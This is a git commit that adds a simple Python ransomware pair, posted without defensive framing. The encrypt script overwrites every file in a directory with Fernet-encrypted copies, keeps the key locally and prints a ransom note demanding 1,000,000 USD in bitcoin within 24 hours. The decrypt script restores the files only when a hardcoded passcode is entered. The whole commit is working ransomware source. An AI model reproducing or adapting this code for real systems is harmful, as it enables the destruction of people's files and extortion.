4aae52cbe5b86878b0bae270d0938aa7e1948545
Samnji <84843673+Samnji@users.noreply.github.com>
2022-06-22 21:15:30 +0300

    ransomeware python script

---
+++ ransomware/decrypt.py
@@ -0,0 +1,29 @@
+import os
+from cryptography.fernet import Fernet
+
+files = []
+
+for file in os.listdir("/home/magicianhacker/Desktop/hacking_scripts/ransomware"):
+        if file == "encrypt.py" or file == "decrypt.py" or file == "thekey.key":
+                continue
+        if os.path.isfile(file):  
+                files.append(file)
+passcode = input("Enter the passcode for decryption: ")
+
+with open("thekey.key", 'rb') as thekey:
+	key = thekey.read()
+if passcode == "don't blame":
+	for file in files:
+		with open(file, 'rb') as thefile:
+			contents = thefile.read()
+
+		decrypted_contents = Fernet(key).decrypt(contents)
+
+		with open(file, 'wb') as  thefile:
+			thefile.write(decrypted_contents)
+
+	print("\n\n\t\t\t\t***YOUR FILES DECRYPTED SUCCESSFULLY***\n\n")
+	print("\t\t\t\t***PLEASURE DOING BUSINESS WITH YOU***")
+else:
+	print("\n\n\t\t\t\t\t***YOU ENTERED THE WRONG PASSCODE***\n\n")
+	print("\t\t\t\t\t***TIMER SPEED INCREASED***")
---
+++ ransomware/encrypt.py
@@ -0,0 +1,28 @@
+import os
+from cryptography.fernet import Fernet
+
+files = []
+
+for file in os.listdir("/home/magicianhacker/Desktop/hacking_scripts/ransomware"):
+        if file == "encrypt.py" or file == "decrypt.py" or file == "thekey.key":
+                continue
+        if os.path.isfile(file):  
+                files.append(file)
+
+key = Fernet.generate_key()
+
+with open("thekey.key", 'wb') as thekey:
+        thekey.write(key)
+
+
+for file in files:
+        with open(file, 'rb') as thefile:
+                contents = thefile.read()
+
+        encrypted_contents = Fernet(key).encrypt(contents)
+
+        with open(file, 'wb') as  thefile:
+                thefile.write(encrypted_contents)
+print("\t\t\t\t\t\t\t*****YOU ARE HACKED*****\n\n")
+print("*******FOR YOUR FILES TO BE DECRYPTED SEND 1000000USD TO THIS BITCOIN ACCOUNT 'JSFGJDSFGHDFG' I WILL SEND YOUU A PASSCODE*******\n\n")
+print("\t\t\t\t\t\t\t*****WITHIN 24HRS !!! CLOCK IS TIKING*****\n\n")
